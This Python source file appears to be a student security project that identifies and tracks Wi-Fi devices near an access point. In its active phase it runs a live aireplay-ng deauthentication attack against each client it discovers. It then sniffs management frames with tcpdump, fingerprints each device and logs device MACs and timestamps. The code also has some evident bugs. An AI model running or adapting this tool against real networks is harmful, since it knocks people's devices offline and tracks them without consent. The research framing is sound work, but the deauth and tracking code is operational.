import os
import subprocess
import sys
from datetime import datetime
from scapy.all import *

# import my own files function
# sys.path.append(os.path.abspath("/root/PycharmProjects/EE209AS-Embedded-System-Security"))
from device_signature import *
from new_ham_dist import *
from device_tracking import *
from monitor_card_setup import *


class sig_stats:
    def __init__(self):
        self.predef_type = {0: "cellphone", 1: "computer", 2: "IoT device", 3: "other", -1: "unknown"}
        self.active_stats = {"cellphone": 0, "computer": 0, "IoT device": 0, "other": 0, "unknown": 0}
        self.all_stats = {"cellphone": 0, "computer": 0, "IoT device": 0, "other": 0, "unknown": 0}
        self.active_dev_list = []
        self.all_dev_list = []
        self.log_file = "device_log.txt"

    def update_active_stats(self):
        for dev in self.active_dev_list:
            self.active_stats[self.predef_type[dev.type]] += 1

    def update_all_stats(self):
        for dev in self.all_dev_list:
            self.all_stats[self.predef_type[dev.type]] += 1

    def active_stats_display(self):
        self.update_active_stats()
        for keys, value in self.active_stats.items():
            print("current period stats: ")
            print(str(value) + keys)

    def all_dev_display(self):
        self.update_all_stats()
        for dev in self.all_dev_list:
            print(dev.name + "," + self.predef_type[dev.type] + "," + dev.mac + "," + dev.time)


# perform deauth attack and build signature from reconnection
def deauth(monitor_card, target, AP, duration='180'):
    print("Perform deauth attack for device " + target)

    # initiate deauth attack
    file = "active_track.pcap"
    FNULL = open (os.devnull, 'w')
    subprocess.Popen("aireplay-ng --deauth 100 -a " + AP + " -c " +
                     target.lower() + " " + monitor_card.lower(),
                     shell=True, stdout=FNULL, stderr=subprocess.STDOUT)
    # os.system("aireplay-ng --deauth 100 -a " + AP + " -c " + target + " " + monitor_card)
    """
    # capture probe request and association
    os.system("timeout " + duration + " tcpdump -i " + monitor_card + " -s 0 -w " + file + ' -v '
              + "ether src " + target + " and type mgt and not subtype beacon")
    rule = "ether src " + target + " and type mgt and not subtype beacon"
    subprocess.call(["timeout", duration, "tcpdump", "-i", monitor_card, "-s", "1000", "-w", file, "-v", rule])
    packets = rdpcap(file)

    # build device signature
    new_sig = build_WifiSig(file, target)
    new_sig.display()
    # return the signature only if it builds a complete signature
    return new_sig if new_sig.has_probe & new_sig.has_ass == 1 else None
    """


# do 5-minutes of packet scanning and find any connection attempt
# if find a association request, build its signature and perform the checking in database
# return a updated new list of device in this time period
# mode 0: only scan for Probe Request/Ass packs, mode 1: also scan for data packets and log new device
def passive_tracking(signature_stats, ap_addr, duration="300", pck_file='tracking.pcap',
                     db_file="signature_database.p", mode=0):
    print("Perform passive tracking...")
    """os.system("timeout " + duration + " tcpdump -i " + monitor_card + " -s 0 -w " + pck_file + ' -v '
              + "type mgt and not subtype beacon")"""

    rule_for_mode0 = "type mgt and subtype assoc-req or subtype probe-req"
    rule_for_mode1 = "type data or subtype assoc-req or subtype probe-req"
    subprocess.call("timeout " + duration + " tcpdump -i " + monitor_card + " -s 1000" + " -w " + pck_file + " -v " +
                     rule_for_mode0 if mode == 0 else rule_for_mode1, shell=True)

    packets = rdpcap(pck_file)

    # record the number of distinct association request
    ass_request = []
    new_dev_list = []

    # first log all device mac address that initiate connection to the AP
    for pack in packets:
        if pack.addr1 == ap_addr.lower() and pack.haslayer("Dot11AssoReq") and pack.addr2 not in ass_request:
            ass_request.append(pack.addr2)
        # if mode not 0, also log for all devices in the network
        if mode != 0:
            if pack.addr1 == ap_addr.lower() and pack.type == 2 and pack.addr2 not in new_dev_list:
                new_dev_list.append(pack.addr2)

    # second build signature for these devices
    for dev_mac in ass_request:
        dev_sig = build_WifiSig(pck_file, dev_mac)

        # only do the check when the signature is valid
        if dev_sig.has_probe == 1 and dev_sig.has_ass == 1:
            new_dev = ham_dist_judgement(db_file, dev_sig)

            # if the matched device not in the device list already
            if new_dev not in signature_stats.active_dev_list:
                signature_stats.active_dev_list.append(new_dev)
            if new_dev not in signature_stats.all_dev_list:
                signature_stats.all_dev_list.append(new_dev)

                # log this device apear info
                new_dev.time = str(datetime.now())
                with open(signature_stats.log_file, 'a+') as f:
                    f.write(new_dev.name+" "+signature_stats.predef_type[new_dev.type]+" "+
                            new_dev.mac+" "+new_dev.time if new_dev.time is not None else "unknown time"+
                            "\n")

    if mode != 0:
        return new_dev_list


def active_phase(ap, mon_card, sig_stats):
    print("enter active phase")
    # first do a device scanning
    device_list = device_tracking(ap_mac, channel="2", duration='30')
    print(device_list)

    # for each device, launch deauth attack and do active fingerprinting
    for dev in device_list:
        deauth(mon_card, target=dev, AP=ap)
        passive_tracking(sig_stats, ap_addr=ap, duration='120', mode=0)

    sig_stats.active_stats_display()
    sig_stats.all_dev_display()
    print("active phase exit")


# passive_dur: passive monitoring duration (s)
# update_fre: how many monitor cycle between adjacent updates
# period: total update times
# running time: (passive_dur/60)*update_fre*period minutes
def passive_phase(ap, ap_channel, sig_stats, passive_dur='300', period=10, update_fre=6):
    # loop for passive monitoring
    for i in range(period):
        for j in range(update_fre):
            # perform passive tracking every passive_dur/60 minute
            passive_tracking(sig_stats, ap_addr=ap, duration=passive_dur, mode=0)

        # display active device info after each period
        sig_stats.active_stats_display()
        sig_stats.all_dev_display()
        # dev_list = device_tracking(ap, channel=ap_channel, duration='30')
        # Also do a scan about current devices in network
        dev_list = passive_tracking(sig_stats, ap_addr=ap, duration=passive_dur, mode=1)

        # if previously active device not in network anymore
        # remove that dev from active dev list
        for dev_info in sig_stats.active_dev_list:
            if dev_info.mac not in dev_list:
                sig_stats.active_dev_list.remove(dev_info)


if __name__ == "__main__":
    ap_mac = '08:95:2a:6e:18:b8'
    general_card = "wlan1"
    monitor_card = 'wlan1mon'

    # setup the card
    # monitor_mode_setup(general_card)

    # the list to hold current active device
    new_sig_stats = sig_stats()

    # enter active phase
    active_phase(ap_mac, monitor_card, new_sig_stats)
    # passive_phase(ap_mac, "2", new_sig_stats, passive_dur='300', period=3, update_fre=4)
